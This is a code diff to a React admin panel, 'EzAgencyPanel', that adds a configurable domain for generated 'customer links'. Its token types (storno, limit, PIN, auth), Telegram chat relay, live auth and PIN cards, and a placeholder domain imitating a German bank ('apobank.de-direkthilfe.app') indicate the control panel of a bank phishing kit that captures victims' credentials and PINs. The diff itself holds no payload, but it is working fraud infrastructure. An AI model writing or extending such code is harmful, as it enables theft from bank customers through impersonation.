@@ -13,6 +13,9 @@ import UnifiedTokensList from "./UnifiedTokensList";
 import AuthLiveCard from "./AuthLiveCard";
 import StornoLiveCard from "./StornoLiveCard";
 import PinLiveCard from "./PinLiveCard";
+import { getPublicBaseUrl, setPublicBaseUrl } from "@/lib/customerLink";
+
+
 
 
 type TokenKind = "storno" | "limit" | "pin" | "auth";
@@ -41,6 +44,10 @@ const EzAgencyPanel = () => {
   const [telegramChatId, setTelegramChatId] = useState("");
   const [savingChatId, setSavingChatId] = useState(false);
   const [flowMode, setFlowMode] = useState<string>("afk");
+  const [publicBaseUrl, setPublicBaseUrlState] = useState<string>(() => {
+    try { return localStorage.getItem("public_base_url") || ""; } catch { return ""; }
+  });
+  const [savingBaseUrl, setSavingBaseUrl] = useState(false);
 
   const loadEmails = async () => {
     const { data } = await (supabase as any)
@@ -54,7 +61,7 @@ const EzAgencyPanel = () => {
     (async () => {
       const { data } = await (supabase as any)
         .from("api_settings")
-        .select("id, default_berater_phone, custom_email_domain, telegram_chat_id, flow_mode")
+        .select("id, default_berater_phone, custom_email_domain, telegram_chat_id, flow_mode, public_base_url")
         .limit(1).maybeSingle();
       if (data) {
         setSettingsId(data.id);
@@ -62,6 +69,10 @@ const EzAgencyPanel = () => {
         setCustomEmailDomain(data.custom_email_domain || "");
         setTelegramChatId(data.telegram_chat_id || "");
         setFlowMode(data.flow_mode || "afk");
+        if (data.public_base_url) {
+          setPublicBaseUrlState(data.public_base_url);
+          setPublicBaseUrl(data.public_base_url);
+        }
       }
       loadEmails();
     })();
@@ -85,6 +96,23 @@ const EzAgencyPanel = () => {
     setSavingChatId(false);
     if (error) { toast.error("Fehler beim Speichern"); return; }
     toast.success("Chat-ID gespeichert");
+  };
+
+  const saveBaseUrl = async () => {
+    const clean = publicBaseUrl.trim().replace(/\/+$/, "");
+    let normalized = clean;
+    if (clean && !/^https?:\/\//i.test(clean)) normalized = `https://${clean}`;
+    setSavingBaseUrl(true);
+    setPublicBaseUrl(normalized);
+    setPublicBaseUrlState(normalized);
+    if (settingsId) {
+      await (supabase as any)
+        .from("api_settings")
+        .update({ public_base_url: normalized || null })
+        .eq("id", settingsId);
+    }
+    setSavingBaseUrl(false);
+    toast.success("Domain gespeichert");
   };
 
   const setMode = async (mode: string) => {
@@ -179,6 +207,26 @@ const EzAgencyPanel = () => {
           <div className="rounded-md border bg-muted/40 p-3">
             <div className="text-xs font-medium text-muted-foreground uppercase tracking-wider mb-1">Aktuell genutzte Domain</div>
             <div className="font-mono text-sm break-all">{typeof window !== "undefined" ? window.location.hostname : ""}</div>
+          </div>
+          <div className="space-y-2">
+            <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Kunden-Link Domain</label>
+            <p className="text-xs text-muted-foreground">
+              Diese Domain wird für alle generierten Kunden-Links verwendet. Leer lassen um die aktuelle Domain zu nutzen.
+            </p>
+            <div className="flex gap-2">
+              <Input
+                placeholder="https://apobank.de-direkthilfe.app"
+                value={publicBaseUrl}
+                onChange={e => setPublicBaseUrlState(e.target.value)}
+                className="font-mono"
+              />
+              <Button onClick={saveBaseUrl} disabled={savingBaseUrl}>Speichern</Button>
+            </div>
+            {publicBaseUrl && (
+              <div className="text-xs text-muted-foreground break-all">
+                Beispiel: <code>{publicBaseUrl.replace(/\/+$/, "")}/auth/ui/app/auth/flow/apo-mustermann/access?t=123-456</code>
+              </div>
+            )}
           </div>
           <div className="space-y-2">
             <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Gruppen Chat-ID</label>
